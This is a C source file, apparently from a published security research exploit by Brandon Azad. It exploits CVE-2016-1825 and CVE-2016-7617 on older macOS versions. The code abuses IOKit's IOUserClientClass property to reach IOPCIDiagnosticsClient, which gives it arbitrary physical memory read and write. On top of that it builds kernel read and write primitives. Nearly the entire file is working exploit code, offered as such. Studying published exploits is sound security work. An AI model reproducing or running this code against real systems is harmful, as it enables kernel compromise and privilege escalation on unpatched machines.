/*
 * physmem.c
 * Brandon Azad
 *
 * An exploit for CVE-2016-1825 and CVE-2016-7617 that allows reading and writing arbitrary
 * physical addresses on macOS.
 *
 * The physmem exploit gives us the ability to read arbitrary physical addresses. Fortunately, on
 * x86-64, kernel virtual addresses within the kernel image can be mapped directly to physical
 * addresses by masking off the upper 32 bits. This means we can implement kernel word read/write
 * primitives directly on top of our physical read/write primitives.
 */
#include "physmem.h"

#include "fail.h"

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>

/* Definitions from IOPCIDevice.h */

enum {
    kIOPCIConfigSpace           = 0,
    kIOPCIIOSpace               = 1,
    kIOPCI32BitMemorySpace      = 2,
    kIOPCI64BitMemorySpace      = 3
};

/* Definitions from IOPCIPrivate.h */

enum {
	kIOPCIDiagnosticsMethodRead  = 0,
	kIOPCIDiagnosticsMethodWrite = 1,
	kIOPCIDiagnosticsMethodCount
};

struct IOPCIDiagnosticsParameters {
	uint32_t options;
	uint32_t spaceType;
	uint32_t bitWidth;
	uint32_t _resv;
	uint64_t value;
	union {
		uint64_t addr64;
		struct {
			unsigned int offset     :16;
			unsigned int function   :3;
			unsigned int device     :5;
			unsigned int bus        :8;
			unsigned int segment    :16;
			unsigned int reserved   :16;
		} pci;
	} address;
};

/*
 * target_service
 *
 * Description:
 * 	The IOKit service that allows setting its IOUserClientClass property.
 *
 * Notes:
 * 	We're assuming that the target macOS version is specified using MACOSX_DEPLOYMENT_TARGET at
 * 	build time. This variable controls the value of __MAC_OS_X_VERSION_MIN_REQUIRED.
 */
#if __MAC_OS_X_VERSION_MIN_REQUIRED <= 101104
// Patched in 10.11.5: https://support.apple.com/en-us/HT206567
#define TARGET_SERVICE		"IOHIDevice"
#elif __MAC_OS_X_VERSION_MIN_REQUIRED <= 101201
// Patched in 10.12.2: https://support.apple.com/en-us/HT207423
#define TARGET_SERVICE		"AppleBroadcomBluetoothHostController"
#else
#error No known IOKit classes allow setting the IOUserClientClass property for this version of macOS.
#define TARGET_SERVICE		NULL
#endif
static const char *target_service = TARGET_SERVICE;

/*
 * connection
 *
 * Description:
 * 	A connection to an instance of IOPCIDiagnosticsClient through which we can access physical
 * 	memory.
 */
static io_connect_t connection;

void physmem_init() {
	// Get a handle to a service that allows setting arbitrary IORegistry properties.
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
			IOServiceMatching(target_service));
	if (service == IO_OBJECT_NULL) {
		FAIL("could not find any services matching %s", target_service);
	}
	// Set the IOUserClientClass property to IOPCIDiagnosticsClient.
	CFStringRef key = CFStringCreateWithCStringNoCopy(kCFAllocatorDefault,
			"IOUserClientClass",
			kCFStringEncodingUTF8,
			kCFAllocatorNull);
	CFStringRef value = CFStringCreateWithCStringNoCopy(kCFAllocatorDefault,
			"IOPCIDiagnosticsClient",
			kCFStringEncodingUTF8,
			kCFAllocatorNull);
	if (key == NULL || value == NULL) {
		FAIL("string allocation failed");
	}
	kern_return_t kr = IORegistryEntrySetCFProperty(service, key, value);
	CFRelease(key);
	CFRelease(value);
	if (kr != KERN_SUCCESS) {
		FAIL("could not set property: %x", kr);
	}
	// Create a connection to the IOPCIDiagnosticsClient.
	kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
	IOObjectRelease(service);
	if (kr != KERN_SUCCESS) {
		FAIL("could not open connection: %x", kr);
	}
}

uint64_t phys_read(uint64_t paddr, unsigned width) {
	struct IOPCIDiagnosticsParameters param;
	param.spaceType      = kIOPCI64BitMemorySpace;
	param.bitWidth       = width * 8;
	param.options        = 0;
	param.address.addr64 = paddr;
	param.value          = -1;
	size_t size = sizeof(param);
	kern_return_t kr = IOConnectCallMethod(connection, kIOPCIDiagnosticsMethodRead,
	                                       NULL,       0,
	                                       &param,     sizeof(param),
	                                       NULL,       NULL,
	                                       &param,     &size);
	if (kr != KERN_SUCCESS) {
		FAIL("could not read physical address %p: %x", (void *)paddr, kr);
	}
	return param.value;
}

void phys_write(uint64_t paddr, uint64_t value, unsigned width) {
	struct IOPCIDiagnosticsParameters param;
	param.spaceType      = kIOPCI64BitMemorySpace;
	param.bitWidth       = width * 8;
	param.options        = 0;
	param.address.addr64 = paddr;
	param.value          = value;
	kern_return_t kr = IOConnectCallMethod(connection, kIOPCIDiagnosticsMethodWrite,
	                                       NULL,       0,
	                                       &param,     sizeof(param),
	                                       NULL,       NULL,
	                                       NULL,       NULL);
	if (kr != KERN_SUCCESS) {
		FAIL("could not write physical address %p: %x", (void *)paddr, kr);
	}
}

/*
 * kernel_virtual_to_physical_mask
 *
 * Description:
 * 	A bit mask to convert kernel virutal addresses within the kernel image to physical
 * 	addresses.
 */
static const uint64_t kernel_virtual_to_physical_mask = 0xffffffff;

uint64_t kern_read(uint64_t kaddr, unsigned width) {
	return phys_read(kaddr & kernel_virtual_to_physical_mask, width);
}

void kern_write(uint64_t kaddr, uint64_t value, unsigned width) {
	phys_write(kaddr & kernel_virtual_to_physical_mask, value, width);
}
